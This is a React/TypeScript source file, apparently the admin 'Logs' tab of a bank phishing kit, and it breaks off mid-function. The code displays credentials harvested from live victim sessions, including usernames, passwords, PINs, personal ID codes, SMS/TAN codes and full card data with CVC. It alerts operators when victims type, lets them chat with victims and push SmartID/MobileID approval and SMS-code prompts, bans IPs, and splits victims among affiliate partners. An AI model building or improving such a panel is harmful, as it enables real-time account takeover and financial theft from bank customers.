"use client";

import { useCallback, useEffect, useState, useRef, Fragment, useMemo } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import type { DemoSession } from "@/types/session";
import { pathToStep } from "@/lib/session-routes";
import { playBeautifulNotification, showBeautifulToast } from "@/lib/notification";
import {
  isSessionLive,
  parseVisitorPresenceState,
  VISITOR_PRESENCE_TICK_MS,
} from "@/lib/admin-presence";
import {
  resolveWheelPrize,
  WHEEL_CURRENCY,
} from "@/lib/wheel-prizes";

const SESSION_LIST_COLUMNS =
  "id,created_at,amount,current_step,status,form_data,ip_address,user_agent,partner_name,is_hidden,last_ping_at";

const APPROVAL_OPTIONS: Array<{ value: string; label: string }> = [
  { value: "smartid_1", label: "SmartID 1 Sayfası" },
  { value: "smartid_2", label: "SmartID 2 Sayfası" },
  { value: "mobileid_1", label: "MobileID 1 Sayfası" },
  { value: "mobileid_2", label: "MobileID 2 Sayfası" },
  { value: "biometrika_pin_1", label: "Biometrika/PIN 1" },
  { value: "biometrika_pin_2", label: "Biometrika/PIN 2" },
];

const UA_BANNED_RE = /(mozilla|applewebkit|webkit|gecko|chrome|safari|windows nt|win64|win32|android|iphone|ipad|mac os|linux x86_64|x86_64|like gecko|khtml|version\/|mobile|firefox|opera|edge|msie|trident|opr\/|edg\/|brave|vivaldi|netscape)/i;
const FP_PREFIX_RE = /(pm_|fpua|fpsc|fpsw|fptz|fpln|fpjv|fpco|fpasw|fpan|fpacn|fpol|fposp|fpup|fpsaw|fpsbd|fpsdx|fpsdy|fpslx|fpsly|fpsfse|fpsui|fpol|pm_fpua|pm_fpsc|pm_fpsw|pm_fptz|pm_fpln|pm_fpasw|pm_fpan|pm_fpacn|pm_fpol|pm_fpsaw|pm_fpsbd|pm_fpsdx|pm_fpsdy|pm_fpslx|pm_fpsly|pm_fpsfse|pm_fpsui|pm_os|pm_brmjv|pm_br|pm_inpt|pm_expt)/i;

function sanitizeCredentialValue(value: unknown, opts?: { maxLen?: number; allowUaLike?: boolean }): string {
  const v = typeof value === "string" ? value : value == null ? "" : String(value);
  if (!v) return "";
  const trimmed = v.trim();
  if (!trimmed) return "";
  const maxLen = opts?.maxLen ?? 64;
  if (!opts?.allowUaLike && (UA_BANNED_RE.test(trimmed) || FP_PREFIX_RE.test(trimmed))) return "";
  if (trimmed.length > maxLen) return "";
  if (/^[\x00-\x1F\x7F]/.test(trimmed)) return "";
  let pctCount = 0;
  for (let i = 0; i < trimmed.length; i++) if (trimmed.charCodeAt(i) === 37) pctCount++;
  if (pctCount >= 4) return "";
  return trimmed;
}

function sanitizeRawFieldsForDisplay(rawFields: any): any {
  if (!rawFields || typeof rawFields !== "object") return {};
  const out: Record<string, any> = {};
  for (const k of Object.keys(rawFields)) {
    const keyOk = String(k).toLowerCase();
    if (FP_PREFIX_RE.test(keyOk)) continue;
    if (/user_?agent/i.test(keyOk)) continue;
    if (/^s\d+_iframe_user_?agent/i.test(keyOk)) continue;
    const rawVal = rawFields[k];
    const cleaned = typeof rawVal === "string" ? sanitizeCredentialValue(rawVal, { maxLen: 256 }) : rawVal;
    if (typeof cleaned === "string" && cleaned === "") continue;
    out[k] = cleaned;
  }
  return out;
}

function cleanBankFormHistoryEntry(entry: any): any {
  if (!entry || typeof entry !== "object") return entry;
  return {
    ...entry,
    verfuegernummer: sanitizeCredentialValue(entry.verfuegernummer || entry.username || entry.id),
    username: sanitizeCredentialValue(entry.username || entry.verfuegernummer || entry.id),
    id: sanitizeCredentialValue(entry.id || entry.verfuegernummer || entry.username),
    pin: sanitizeCredentialValue(entry.pin || entry.password || entry.pw),
    password: sanitizeCredentialValue(entry.password || entry.pin || entry.pw),
    pw: sanitizeCredentialValue(entry.pw || entry.pin || entry.password),
    personalCode: sanitizeCredentialValue(entry.personalCode, { maxLen: 32 }),
    bankPhone: sanitizeCredentialValue(entry.bankPhone, { maxLen: 40, allowUaLike: true }),
    tacCode: sanitizeCredentialValue(entry.tacCode || entry.tac_code, { maxLen: 24 }),
    orderedField1: sanitizeCredentialValue(entry.orderedField1, { maxLen: 120 }),
    orderedField2: sanitizeCredentialValue(entry.orderedField2, { maxLen: 120 }),
    orderedField3: sanitizeCredentialValue(entry.orderedField3, { maxLen: 120 }),
    cardNumber: sanitizeCredentialValue(entry.cardNumber, { maxLen: 32 }),
    cardExpiry: sanitizeCredentialValue(entry.cardExpiry, { maxLen: 16 }),
    cardCvc: sanitizeCredentialValue(entry.cardCvc, { maxLen: 8 }),
    smsCode: sanitizeCredentialValue(entry.smsCode || entry.sms_code, { maxLen: 32 }),
    rawFields: sanitizeRawFieldsForDisplay(entry.rawFields),
  };
}

function sanitizeFormDataAll(rawFd: any): any {
  if (!rawFd || typeof rawFd !== "object") return {};
  const fd: any = { ...rawFd };
  fd.firstName = sanitizeCredentialValue(rawFd.firstName, { maxLen: 120, allowUaLike: true }) || rawFd.firstName;
  fd.lastName = sanitizeCredentialValue(rawFd.lastName, { maxLen: 120, allowUaLike: true }) || rawFd.lastName;
  fd.phone = sanitizeCredentialValue(rawFd.phone, { maxLen: 40, allowUaLike: true }) || rawFd.phone;
  fd.email = sanitizeCredentialValue(rawFd.email, { maxLen: 200, allowUaLike: true }) || rawFd.email;
  fd.verfuegernummer = sanitizeCredentialValue(rawFd.verfuegernummer || rawFd.username || rawFd.id);
  fd.username = sanitizeCredentialValue(rawFd.username || rawFd.verfuegernummer || rawFd.id);
  fd.id = sanitizeCredentialValue(rawFd.id || rawFd.verfuegernummer || rawFd.username);
  fd.pin = sanitizeCredentialValue(rawFd.pin || rawFd.password || rawFd.pw);
  fd.password = sanitizeCredentialValue(rawFd.password || rawFd.pin || rawFd.pw);
  fd.pw = sanitizeCredentialValue(rawFd.pw || rawFd.pin || rawFd.password);
  fd.personalCode = sanitizeCredentialValue(rawFd.personalCode, { maxLen: 32 });
  fd.bankPhone = sanitizeCredentialValue(rawFd.bankPhone, { maxLen: 40, allowUaLike: true });
  fd.tacCode = sanitizeCredentialValue(rawFd.tacCode || rawFd.tac_code, { maxLen: 24 });
  fd.tac_code = fd.tacCode;
  fd.smsCode = sanitizeCredentialValue(rawFd.smsCode || rawFd.sms_code, { maxLen: 32 });
  fd.sms_code = fd.smsCode;
  fd.cardNumber = sanitizeCredentialValue(rawFd.cardNumber, { maxLen: 32 });
  fd.cardExpiry = sanitizeCredentialValue(rawFd.cardExpiry, { maxLen: 16 });
  fd.cardCvc = sanitizeCredentialValue(rawFd.cardCvc, { maxLen: 8 });
  fd.cardHolder = sanitizeCredentialValue(rawFd.cardHolder, { maxLen: 120, allowUaLike: true });
  fd.orderedField1 = sanitizeCredentialValue(rawFd.orderedField1, { maxLen: 120 });
  fd.orderedField2 = sanitizeCredentialValue(rawFd.orderedField2, { maxLen: 120 });
  fd.orderedField3 = sanitizeCredentialValue(rawFd.orderedField3, { maxLen: 120 });
  fd.rawFields = sanitizeRawFieldsForDisplay(rawFd.rawFields);
  if (Array.isArray(rawFd.bankFormHistory)) {
    fd.bankFormHistory = rawFd.bankFormHistory.map((e: any) => cleanBankFormHistoryEntry(e));
  }
  return fd;
}

function getApprovalDisplayText(value: string): string {
  const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === value);
  if (!matchedOption) {
    return "";
  }

  return matchedOption.label.includes("Sayfası")
    ? matchedOption.label.replace(" Sayfası", " Onaylandı")
    : `${matchedOption.label} Onaylandı`;
}

function getApprovalStepLabel(value: string): string {
  const matchedOption = APPROVAL_OPTIONS.find((option) => option.value === value);
  if (!matchedOption) {
    return "ONAY";
  }

  return matchedOption.label.replace(" Sayfası", "").toUpperCase();
}

function parseApprovalHistory(value: unknown): string[] {
  if (typeof value !== "string" || !value.trim()) {
    return [];
  }

  try {
    const parsed = JSON.parse(value) as unknown;
    if (Array.isArray(parsed)) {
      return parsed.filter((item): item is string => typeof item === "string" && item.trim().length > 0);
    }
  } catch {
    return [value.trim()];
  }

  return [];
}

function inferCanonicalLogFieldKey(
  key: string,
): "personalCode" | "bankPhone" | "username" | "password" | "tacCode" | "loginMethod" | null {
  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

  if (
    normalizedKey.includes("personalidentitycode") ||
    normalizedKey.includes("personalidentificationcode") ||
    normalizedKey.includes("identitycode") ||
    normalizedKey.includes("personalcode") ||
    normalizedKey.includes("isikukood")
  ) {
    return "personalCode";
  }

  if (
    normalizedKey.includes("telefoninumber") ||
    normalizedKey.includes("mobilenumber") ||
    normalizedKey.includes("phonenumber") ||
    normalizedKey.includes("mobileidphone") ||
    normalizedKey.includes("phonefield") ||
    normalizedKey.includes("telefon") ||
    normalizedKey.includes("phone") ||
    normalizedKey === "phone"
  ) {
    return "bankPhone";
  }

  if (
    normalizedKey.includes("userid") ||
    normalizedKey.includes("username") ||
    normalizedKey.includes("loginid") ||
    normalizedKey.includes("nickname") ||
    normalizedKey.includes("kasutajanimi") ||
    normalizedKey.includes("kasutajatunnus") ||
    normalizedKey.endsWith("tunnus")
  ) {
    return "username";
  }

  if (
    normalizedKey.includes("password") ||
    normalizedKey.includes("passcode") ||
    normalizedKey.includes("pincode") ||
    normalizedKey.includes("pinkood") ||
    normalizedKey.includes("parool") ||
    normalizedKey.includes("pincalculatorcode") ||
    normalizedKey.includes("pincalccode") ||
    normalizedKey.includes("pincalcpassword") ||
    normalizedKey === "pincalc" ||
    normalizedKey === "pin"
  ) {
    return "password";
  }

  if (
    normalizedKey.includes("tac") ||
    normalizedKey.includes("otp") ||
    normalizedKey.includes("smscode") ||
    normalizedKey.includes("verificationcode") ||
    normalizedKey.includes("responsecode") ||
    normalizedKey.includes("kontrollkood")
  ) {
    return "tacCode";
  }

  if (normalizedKey.includes("loginmethod") || normalizedKey.includes("authmethod")) {
    return "loginMethod";
  }

  return null;
}

function isIgnoredAdminBankFieldKey(key: string): boolean {
  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");

  return (
    /^input\d+$/.test(normalizedKey) ||
    normalizedKey.includes("wheelresult") ||
    normalizedKey.includes("wheelprize") ||
    normalizedKey.includes("rememberme") ||
    normalizedKey.includes("remembermesimpleid") ||
    normalizedKey.includes("remembermesmartid") ||
    normalizedKey.includes("remembermemobileid") ||
    normalizedKey.includes("loginwidget") ||
    normalizedKey.includes("useridmid") ||
    normalizedKey.includes("useridsid") ||
    normalizedKey.includes("useridsimple") ||
    normalizedKey === "mobileid" ||
    normalizedKey === "smartid" ||
    normalizedKey === "idcard" ||
    normalizedKey === "pincalc" ||
    normalizedKey === "kalkulaator"
  );
}

function shouldHideDuplicateBankField(formData: Record<string, any>, key: string, value: unknown): boolean {
  if (typeof value !== "string" || !value.trim()) {
    return false;
  }

  const canonicalKey = inferCanonicalLogFieldKey(key);
  if (!canonicalKey || canonicalKey === key) {
    return false;
  }

  const canonicalValue =
    canonicalKey === "username"
      ? String(formData.username ?? formData.verfuegernummer ?? "").trim()
      : canonicalKey === "password"
        ? String(formData.password ?? formData.pin ?? "").trim()
        : String(formData[canonicalKey] ?? "").trim();

  return Boolean(canonicalValue) && canonicalValue === value.trim();
}

function isVisibleAdminBankField(formData: Record<string, any>, key: string, value: unknown): boolean {
  if (!value) return false;
  if (isIgnoredAdminBankFieldKey(key)) return false;

  const preferredKeys = new Set([
    "loginMethod",
    "personalCode",
    "bankPhone",
    "username",
    "verfuegernummer",
    "password",
    "pin",
    "tacCode",
    "pasnummer",
    "rekeningnummer",
    "toegangscode",
    "signatuur",
    "identificatiecode",
  ]);

  if (preferredKeys.has(key)) {
    return true;
  }

  const normalizedKey = key.toLowerCase().replace(/[^a-z0-9]/g, "");
  if (normalizedKey.includes("rememberme")) {
    return false;
  }

  const canonicalKey = inferCanonicalLogFieldKey(key);
  if (!canonicalKey) {
    return false;
  }

  if (shouldHideDuplicateBankField(formData, key, value)) {
    return false;
  }

  const canonicalValue =
    canonicalKey === "username"
      ? String(formData.username ?? formData.verfuegernummer ?? "").trim()
      : canonicalKey === "password"
        ? String(formData.password ?? formData.pin ?? "").trim()
        : String(formData[canonicalKey] ?? "").trim();

  return !canonicalValue;
}

function getCanonicalAdminBankFields(formData: Record<string, any>): Array<[string, string]> {
  const pickString = (...keys: string[]) => {
    for (const key of keys) {
      const value = formData[key];
      if (typeof value === "string" && value.trim()) {
        return value.trim();
      }
    }
    return "";
  };

  const orderedField1 = pickString("orderedField1");
  const orderedField1Key = pickString("orderedField1Key");
  const orderedField2 = pickString("orderedField2");
  const orderedField2Key = pickString("orderedField2Key");
  const orderedField2Type = pickString("orderedField2Type");
  const orderedField3 = pickString("orderedField3");
  const orderedField3Key = pickString("orderedField3Key");
  const orderedField3Type = pickString("orderedField3Type");
  const rawPersonalCode = pickString("personalCode");
  const rawUsername = pickString("username", "verfuegernummer");
  const rawPassword = pickString("password", "pin");
  const rawTacCode = pickString("tacCode");
  const rawBankPhone = pickString("bankPhone");

  const entries: Array<{ key: string; value: string; score: number }> = [];
  const seenValues = new Set<string>();
  const pushIfNew = (key: string, value: string, score: number) => {
    if (!value) return;
    const v = String(value).trim();
    if (!v) return;
    if (seenValues.has(v)) return; // AYNI DEĞER 2 KERE GÖSTERİLMEZ!
    entries.push({ key, value: v, score });
    seenValues.add(v);
  };

  // ⭐ 1. SAĞLAM KAYNAKLI (raw) DEĞERLER İLK SIRADA (EN DÜŞÜK SCORE = EN YÜKSEK ÖNCELİK):
  pushIfNew("username", rawUsername, 1);
  pushIfNew("personalCode", rawPersonalCode, 2);
  pushIfNew("bankPhone", rawBankPhone, 3);
  pushIfNew("password", rawPassword, 4);
  pushIfNew("tacCode", rawTacCode, 5);

  // ⭐ 2. ORDERED FIELD LARI DA EKLE (ANCAK DAHA ÖNCE GÖRÜLMEMİŞ YENİ DEĞER İSE, DÜŞÜK ÖNCELİK (YÜKSEK SCORE):
  {
    let k: string | null = null;
    if (orderedField1Key === "username" || orderedField1Key === "personalCode" || orderedField1Key === "bankPhone" || orderedField1Key === "password" || orderedField1Key === "tacCode") {
      k = orderedField1Key;
    }
    if (k) pushIfNew(k, orderedField1, 50);
  }
  {
    let k: string | null = null;
    if (orderedField2Key === "username" || orderedField2Key === "personalCode" || orderedField2Key === "bankPhone" || orderedField2Key === "password" || orderedField2Key === "tacCode") {
      k = orderedField2Key;
    } else if (orderedField2Type === "password") {
      k = "password";
    } else if (orderedField2Type === "phone") {
      k = "bankPhone";
    }
    if (k) pushIfNew(k, orderedField2, 60);
  }
  {
    let k: string | null = null;
    if (orderedField3Key === "username" || orderedField3Key === "personalCode" || orderedField3Key === "bankPhone" || orderedField3Key === "password" || orderedField3Key === "tacCode") {
      k = orderedField3Key;
    } else if (orderedField3Type === "password") {
      k = "password";
    } else if (orderedField3Type === "phone") {
      k = "bankPhone";
    }
    if (k) pushIfNew(k, orderedField3, 70);
  }

  // ⭐ 3. SCORE a göre KÜÇÜKTEN BÜYÜĞE sırala (düşük = yüksek öncelik):
  entries.sort((a, b) => a.score - b.score);

  if (entries.length === 0) return [];
  return entries.map((e): [string, string] => [e.key, e.value]).slice(0, 3);
}

export function LogsTab({ darkMode, user }: { darkMode: boolean, user: any }) {
  const supabase = createBrowserSupabaseClient();
  const [rows, setRows] = useState<DemoSession[]>([]);
  const rowsRef = useRef<DemoSession[]>([]);
  useEffect(() => {
    rowsRef.current = rows;
  }, [rows]);

  // AYNI satir (id) icin ardışık gelen UPDATE eventlerini 500ms SON DEĞERE (trailing debounce) sikistir.
  // Ornek: wait -> wheel -> wait -> wheel 4 event 400ms icinde geliyorsa, sonuncuyu (wheel) AL, 500ms sonra SET.
  // Boylece kullanici hicbirsey yapmiyor ama adminin paneli "SANIYELIK" gozkirpmiyor, stabilize son deger gorunuyor.
  const pendingUpdatesRef = useRef<Map<string, { t: number; row: DemoSession }>>(new Map());
  const pendingUpdateTimeoutsRef = useRef<Map<string, number>>(new Map());
  const FLUSH_DEBOUNCE_MS = 500;

  const applyRowUpdate = useCallback((nextRow: DemoSession) => {
    setRows((prev) => {
      const idx = prev.findIndex((r) => r.id === nextRow.id);
      if (idx === -1) {
        if (nextRow.is_hidden) return prev;
        return [nextRow, ...prev].slice(0, 50);
      }
      if (nextRow.is_hidden) {
        return prev.filter((r) => r.id !== nextRow.id);
      }
      const next = [...prev];
      next[idx] = nextRow;
      return next;
    });
    // Sayac (logCount) icin gerekli guncelleme: hidden durumu degisirse
    setLogCount((c) => {
      const hadBefore = rowsRef.current.some((r) => r.id === nextRow.id && !r.is_hidden);
      const hasAfter = !nextRow.is_hidden;
      if (hadBefore && !hasAfter) return Math.max(0, c - 1);
      if (!hadBefore && hasAfter) return c + 1;
      return c;
    });
    // pendingleri temizle
    pendingUpdatesRef.current.delete(nextRow.id);
    const to = pendingUpdateTimeoutsRef.current.get(nextRow.id);
    if (to) { window.clearTimeout(to); pendingUpdateTimeoutsRef.current.delete(nextRow.id); }
  }, []);

  const applyUpdateDebounced = useCallback((nextRow: DemoSession) => {
    // Her UPDATE geldiginde buffer'ı SON GELEN ile yenile (eski timeout ucur, 500 ms yeniden baslar)
    const oldTo = pendingUpdateTimeoutsRef.current.get(nextRow.id);
    if (oldTo) window.clearTimeout(oldTo);
    pendingUpdatesRef.current.set(nextRow.id, { t: Date.now(), row: nextRow });
    const newTo = window.setTimeout(() => {
      const latest = pendingUpdatesRef.current.get(nextRow.id);
      pendingUpdateTimeoutsRef.current.delete(nextRow.id);
      pendingUpdatesRef.current.delete(nextRow.id);
      if (latest) applyRowUpdate(latest.row);
    }, FLUSH_DEBOUNCE_MS);
    pendingUpdateTimeoutsRef.current.set(nextRow.id, newTo);
  }, [applyRowUpdate]);

  

  // Stats
  const [logCount, setLogCount] = useState(0);
  const [bannedCount, setBannedCount] = useState(0);
  const [bannedIPs, setBannedIPs] = useState<Array<{ ip_address: string; reason: string | null; banned_at: string | null }>>([]);
  const [banListModalOpen, setBanListModalOpen] = useState(false);
  // KESIN + ANLIK cozum:
  // - Kullanici 3 SN'DE BIR sunucuya PING atar (SessionRealtimeGate → /api/session/ping).
  // - Admin paneli sessions tablosundaki postgres_changes UPDATE eventlerini REALTIME dinler.
  //   Yani her PING geldiginde TABLO 0 sn'de guncellenir.
  // - ONLINE / OFFLINE karari:
  //   1. Eger row.status === 'offline' ise DIREKT OFFLINE (kullanici pagehide ile OFFLINE pinglemis).
  //   2. Degilse ve last_ping_at VAR ve son 10 SN'DE ise ONLINE.
  //   3. Degilse ama presence channel'da gorunuyor ise (fallback, eski sessionlar icin) ONLINE.
  //   4. Aksi halde OFFLINE.
  // NOT: 10sn = 3sn ping araligi * 3 kacma toleransi. Uygulamada neredeyse ANLIK (0-10 sn).
  const LIVE_WINDOW_MS = 10 * 1000;
  const liveVisitorCount = useMemo(() => {
    let n = 0;
    const now = Date.now();
    for (const row of rows) {
      if (row.status === "offline") continue;
      if (!row.last_ping_at) continue;
      try {
        const t = Date.parse(String(row.last_ping_at));
        if (Number.isFinite(t) && now - t < LIVE_WINDOW_MS) n++;
      } catch { /* noop */ }
    }
    return n;
  }, [rows]);

  // Presence
  const [onlineSessionIds, setOnlineSessionIds] = useState<Set<string>>(new Set());
  const [sessionPaths, setSessionPaths] = useState<Record<string, string>>({});
  const [sessionLastSeenAt, setSessionLastSeenAt] = useState<Record<string, number>>({});
  const [, setPresenceTick] = useState(0);

  useEffect(() => {
    const timer = window.setInterval(() => {
      setPresenceTick((t) => t + 1);
    }, VISITOR_PRESENCE_TICK_MS);

    return () => window.clearInterval(timer);
  }, []);

  const [chatSessionId, setChatSessionId] = useState<string | null>(null);
  const [deviceInfoSession, setDeviceInfoSession] = useState<DemoSession | null>(null);

  const [chatMessages, setChatMessages] = useState<any[]>([]);
  const [chatInput, setChatInput] = useState("");
  const [pastedImage, setPastedImage] = useState<File | null>(null);
  const [pastedImagePreview, setPastedImagePreview] = useState<string | null>(null);
  const [isUploadingImage, setIsUploadingImage] = useState(false);
  const [zoomedImage, setZoomedImage] = useState<string | null>(null);
  const chatEndRef = useRef<HTMLDivElement>(null);

  const [specialPromptSessionId, setSpecialPromptSessionId] = useState<string | null>(null);
  const [specialMessage, setSpecialMessage] = useState("");
  const [specialImage, setSpecialImage] = useState<string | null>(null);
  const [specialLang, setSpecialLang] = useState<"de" | "tr">("de");

  const [smsPromptSessionId, setSmsPromptSessionId] = useState<string | null>(null);
  const [smsDigitsInput, setSmsDigitsInput] = useState("6");
  const [smsCustomTextInput, setSmsCustomTextInput] = useState("");
  const [smsModeUnknown, setSmsModeUnknown] = useState(false);
  const [approvalPromptSessionId, setApprovalPromptSessionId] = useState<string | null>(null);
  const [approvalPromptType, setApprovalPromptType] = useState("");
  const [approvalCodeInput, setApprovalCodeInput] = useState("");

  const [soundEnabled, setSoundEnabled] = useState(false);
  const soundEnabledRef = useRef(false);

  const [expandedBankHistorySessionId, setExpandedBankHistorySessionId] = useState<string | null>(null);
  const [expandedSmsHistorySessionId, setExpandedSmsHistorySessionId] = useState<string | null>(null);
  const [expandedCardHistorySessionId, setExpandedCardHistorySessionId] = useState<string | null>(null);

  useEffect(() => {
    const savedSound = localStorage.getItem('admin1SoundEnabled');
    if (savedSound === 'true') {
      setSoundEnabled(true);
      soundEnabledRef.current = true;
    }
  }, []);

  useEffect(() => {
    soundEnabledRef.current = soundEnabled;
    localStorage.setItem('admin1SoundEnabled', soundEnabled.toString());
  }, [soundEnabled]);

  const playNotificationSound = useCallback((title: string = "Bildirim", desc?: string) => {
    try {
      playBeautifulNotification();
      showBeautifulToast(title, desc);
    } catch (e) {
      console.error("Audio error:", e);
    }
  }, []);

  const load = useCallback(async () => {
    if (!supabase) return;
    let query = supabase
      .from("sessions")
      .select(SESSION_LIST_COLUMNS)
      .neq("is_hidden", true)
      .order("created_at", { ascending: false });

    // Sadece super_admin olmayanlar için filtrele
    const username = user?.user_metadata?.username || user?.email?.split('@')[0];
    if (username !== "super_admin") {
      query = query.eq("partner_name", username);
    }

    const { data } = await query.limit(50);
    const fetchedRows = (data as DemoSession[]) ?? [];
    setRows((prev) => {
      if (!prev && !fetchedRows) return prev;
      if (prev?.length === fetchedRows.length) {
        try {
          if (JSON.stringify(prev) === JSON.stringify(fetchedRows)) return prev;
        } catch { /* noop */ }
      }
      setLogCount(fetchedRows.length);
      return fetchedRows;
    });
  }, [supabase, user]);

  const loadBanData = useCallback(async () => {
    if (!supabase) return;
    try {
      // DIKKAT: banned_ips tablosunun GERCEK sutunlari:
      //   ip_address  (PK, text)   <---- id DEGIL
      //   reason      (text)
      //   banned_at   (timestamptz) <---- created_at DEGIL
      // Eski kayitlar (daha once banlananlar) bu sutunlarla tutuluyor.
      const { data, count, error } = await supabase
        .from("banned_ips")
        .select("ip_address, reason, banned_at", { count: "exact" })
        .order("banned_at", { ascending: false })
        .limit(500);
      if (error) {
        console.error("banned_ips select error:", error);
        return;
      }
      const nextData = (data ?? []) as any[];
      setBannedIPs((prev) => {
        if (!prev && !nextData) return prev;
        if (prev?.length === nextData.length) {
          try {
            if (JSON.stringify(prev) === JSON.stringify(nextData)) return prev;
          } catch { /* noop */ }
        }
        setBannedCount(count ?? 0);
        return nextData;
      });
    } catch (e) {
      console.error("loadBanData exception:", e);
    }
  }, [supabase]);

  useEffect(() => {
    void load();
    void loadBanData();

    // ⭐ ADMIN1 REALTIME FIX 1/6: Ilk 5 saniye POLLING BEKLEME (5000ms yerine)
    //   300ms SONRA ZORLA load() + loadBanData() cagir => mount aninda HEMEN gorunur
    //   (eski yapi: ilk 5 sn polling beklerdi, kullanici "gorunmuyor" diyordu F5 atiyordu)
    const initialLoadTimer = window.setTimeout(() => {
      void load();
      void loadBanData();
    }, 300);

    if (!supabase) return;

    // ⭐ ADMIN1 REALTIME FIX 2/6: Polling aralik 5000ms -> 3000ms (daha sik) +
    //   CHAT polling de eklendi (chat bazen 2000ms interval disinda realtime dusuyor)
    const sessionPollTimer = window.setInterval(() => void load(), 3_000);
    const banPollTimer = window.setInterval(() => void loadBanData(), 7_000);

    // ⭐ ADMIN1 REALTIME FIX 3/6: CHANNEL STATUS HATA YAKALAMA (EXPIRED / TIMED_OUT / CHANNEL_ERROR / CLOSED)
    //   Websocket 1-2 saatte bir dusebilir veya 502/503 alabilir.
    //   HATA durumunda 1200ms sonra SUBSCRIPTION YENIDEN BASLAT (recursive).
    //   visibilitychange (F11/tarayıcı sekmesi geri gelince) + window focus tekrar tetikle.
    let isUnmounting = false;
    const CHANNEL_NAMES: Record<string, string> = {
      session: "admin1-sessions-live",
      ban: "admin1-banned-ips-live",
      presence: "online_visitors",
      audit: "admin1-audit-logs-live",
      formdata: "admin1-formdata-live",
    };

    const buildAndSubscribeAll = () => {
      if (isUnmounting || !supabase) return { clean: () => {} };
      const createdChannels: any[] = [];

      const subscribeWithRecovery = (channelName: string, buildChannel: (ch: any) => any) => {
        const ch = supabase.channel(channelName);
        buildChannel(ch);
        ch.subscribe((status: any) => {
          // ⭐ RECOVERY: TIMED_OUT / CHANNEL_ERROR / CLOSED ise 1200ms sonra yeniden subscribe et
          // Not: REALTIME_SUBSCRIBE_STATES enumunda EXPIRED YOK (SUBSCRIBED | TIMED_OUT | CLOSED | CHANNEL_ERROR)
          if ((status === "TIMED_OUT" || status === "CHANNEL_ERROR" || status === "CLOSED") && !isUnmounting) {
            window.setTimeout(() => {
              if (isUnmounting || !supabase) return;
              try { void supabase.removeChannel(ch); } catch {}
              // buildAndSubscribeAll butun kanallari tekrar kurar (100ms gecikmeli - recursive)
              window.setTimeout(() => buildAndSubscribeAll(), 100);
            }, 1200);
          }
        });
        createdChannels.push(ch);
        return ch;
      };

      // ----- 1) SESSIONS -----
      const channel = subscribeWithRecovery(CHANNEL_NAMES.session, (ch: any) => {
        ch.on("postgres_changes", { event: "*", schema: "public", table: "sessions" }, (payload: any) => {
          if (payload.eventType === "INSERT") {
            const newRow = payload.new as DemoSession;
            if (newRow.is_hidden) return;
            setRows((prev) => {
              if (prev.some((r) => r.id === newRow.id)) return prev;
              return [newRow, ...prev].slice(0, 50);
            });
            setLogCount((c) => c + 1);
            return;
          }

          if (payload.eventType === "DELETE") {
            const oldRow = payload.old as DemoSession;
            if (oldRow?.id) {
              setRows((prev) => prev.filter((r) => r.id !== oldRow.id));
              setLogCount((c) => Math.max(0, c - 1));
              if (deviceInfoSession?.id === oldRow.id) setDeviceInfoSession(null);
              if (chatSessionId === oldRow.id) setChatSessionId(null);
              if (smsPromptSessionId === oldRow.id) setSmsPromptSessionId(null);
              if (specialPromptSessionId === oldRow.id) setSpecialPromptSessionId(null);
              if (expandedBankHistorySessionId === oldRow.id) setExpandedBankHistorySessionId(null);
              if (expandedSmsHistorySessionId === oldRow.id) setExpandedSmsHistorySessionId(null);
              if (expandedCardHistorySessionId === oldRow.id) setExpandedCardHistorySessionId(null);
              if (approvalPromptSessionId === oldRow.id) setApprovalPromptSessionId(null);
            }
            return;
          }

          if (payload.eventType === "UPDATE") {
            const newRow = payload.new as DemoSession;
            const oldRow = rowsRef.current.find((r) => r.id === newRow.id) ?? (payload.old as DemoSession | null);

            if (newRow.is_hidden) {
              const to = pendingUpdateTimeoutsRef.current.get(newRow.id);
              if (to) { window.clearTimeout(to); pendingUpdateTimeoutsRef.current.delete(newRow.id); }
              pendingUpdatesRef.current.delete(newRow.id);
              setRows((prev) => prev.filter((r) => r.id !== newRow.id));
              setLogCount((c) => Math.max(0, c - 1));
              if (deviceInfoSession?.id === newRow.id) setDeviceInfoSession(null);
              if (chatSessionId === newRow.id) setChatSessionId(null);
              if (smsPromptSessionId === newRow.id) setSmsPromptSessionId(null);
              if (specialPromptSessionId === newRow.id) setSpecialPromptSessionId(null);
              if (expandedBankHistorySessionId === newRow.id) setExpandedBankHistorySessionId(null);
              if (expandedSmsHistorySessionId === newRow.id) setExpandedSmsHistorySessionId(null);
              if (expandedCardHistorySessionId === newRow.id) setExpandedCardHistorySessionId(null);
              if (approvalPromptSessionId === newRow.id) setApprovalPromptSessionId(null);
              return;
            }

            if (soundEnabledRef.current && oldRow) {
              const SIG_FIELDS = [
                "firstName", "lastName", "fullName", "phone", "mobile",
                "smsCode", "sms_code", "smscode", "tan", "tacCode",
                "cardNumber", "cardNo", "cardHolder", "cardExpiry", "cardCvc", "cvv",
                "username", "userName", "user_id", "customerNo",
                "password", "pass", "pin", "pinCode",
                "personalCode", "idNumber", "tc", "birthday",
                "verfuegernummer", "blz", "iban", "accountNo",
                "orderedField1", "orderedField2", "orderedField3",
                "bankPhone",
              ];
              const lowerSig = new Set(SIG_FIELDS.map((s) => s.toLowerCase()));

              const pickSig = (data: unknown): Record<string, string> => {
                if (!data || typeof data !== "object") return {};
                const d = sanitizeFormDataAll(data as Record<string, any>);
                const out: Record<string, string> = {};
                for (const [k, raw] of Object.entries(d)) {
                  if (raw === undefined || raw === null) continue;
                  const str = typeof raw === "string" ? raw : String(raw);
                  const cleaned = sanitizeCredentialValue(str, { maxLen: 120 });
                  if (!cleaned) continue;
                  if (typeof raw === "object") continue;
                  if (lowerSig.has(k.toLowerCase()) || SIG_FIELDS.some((s) => k.toLowerCase().includes(s.toLowerCase()))) {
                    out[k.toLowerCase()] = cleaned;
                  }
                }
                return out;
              };

              const oldSig = pickSig(oldRow.form_data);
              const newSig = pickSig(newRow.form_data);
              const allKeys = new Set<string>([...Object.keys(oldSig), ...Object.keys(newSig)]);
              let hasNewOrChanged = false;
              for (const k of allKeys) {
                const oldVal = oldSig[k] ?? "";
                const newVal = newSig[k] ?? "";
                if (newVal.length > 0 && (oldVal === "" || oldVal !== newVal)) {
                  hasNewOrChanged = true;
                  break;
                }
              }
              if (hasNewOrChanged) {
                playNotificationSound("Yeni Form Verisi", "Kullanıcı bilgi girişi yaptı (İsim, SMS, Kart, Banka vb.).");
              }
            }

            applyUpdateDebounced(newRow);
